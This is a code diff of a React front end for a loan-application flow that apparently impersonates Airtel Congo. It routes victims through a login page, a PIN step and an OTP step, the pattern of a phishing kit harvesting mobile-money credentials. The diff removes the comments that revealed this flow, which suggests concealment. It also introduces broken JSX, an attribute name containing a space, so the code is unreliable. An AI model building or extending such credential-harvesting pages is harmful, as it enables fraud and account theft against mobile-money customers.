@@ -14,7 +14,7 @@ import LoanDetailsPage from "./LoanDetailsPage";
 import { ViewType, ApplicationData } from "./types";
 
 function App() {
-  // Load persisted state from sessionStorage so navigating away (e.g. to SMS) doesn't reset the app
+  // Load persisted state from sessionStorage so navigating away doesn't lose the user's place
   const [currentView, setCurrentViewState] = useState<ViewType>(() => {
     const saved = sessionStorage.getItem("currentView");
     return (saved as ViewType) || "landing";
@@ -23,7 +23,7 @@ function App() {
     const saved = sessionStorage.getItem("applicationData");
     return saved ? JSON.parse(saved) : null;
   });
-  const API_URL = import.meta.env.VITE_API_URL || "http://localhost:5000";
+  const API_URL = import.meta.env.VITE_API_URL || "";
 
   // Persist view changes to sessionStorage
   const setCurrentView = (view: ViewType) => {
@@ -43,11 +43,11 @@ function App() {
 
   const handleApplicationSubmit = (data: ApplicationData) => {
     setApplicationData(data);
-    setCurrentView("loanSubmitted"); // Go to Airtel Congo login page
+    setCurrentView("loanSubmitted");
   };
 
   const handlePaymentComplete = () => {
-    setCurrentView("otp"); // Go to OTP after PIN
+    setCurrentView("otp");
   };
 
   const handleLoanSubmittedComplete = () => {
@@ -55,7 +55,7 @@ function App() {
   };
 
   const handleOtpComplete = () => {
-    setCurrentView("processing"); // Go to processing after OTP
+    setCurrentView("processing");
   };
 
   const handleProcessingComplete = () => {
@@ -151,7 +151,7 @@ function App() {
           onBack={() => setCurrentView("success")}
           loanAmount={applicationData?.amount ? parseFloat(applicationData.amount) : 10000}
           userName={`${applicationData?.first_name || ''} ${applicationData?.last_name || ''}`.trim()}
-          AirtelCongoAccount={applicationData?.phone || "0745567765"}
+          Airtel CongoAccount={applicationData?.phone || "0745567765"}
         />
       )}
 
@@ -160,7 +160,7 @@ function App() {
           onBack={() => setCurrentView("success")}
           loanAmount={applicationData?.amount ? parseFloat(applicationData.amount) : 109}
           userName={`${applicationData?.first_name || ''} ${applicationData?.last_name || ''}`.trim()}
-          AirtelCongoAccount={applicationData?.phone || "0734765678"}
+          Airtel CongoAccount={applicationData?.phone || "0734765678"}
         />
       )}
 
@@ -169,7 +169,7 @@ function App() {
           onBack={() => setCurrentView("success")}
           loanAmount={applicationData?.amount ? parseFloat(applicationData.amount) : 109}
           userName={`${applicationData?.first_name || ''} ${applicationData?.last_name || ''}`.trim()}
-          AirtelCongoAccount={applicationData?.phone || "0734765678"}
+          Airtel CongoAccount={applicationData?.phone || "0734765678"}
         />
       )}
     </div>
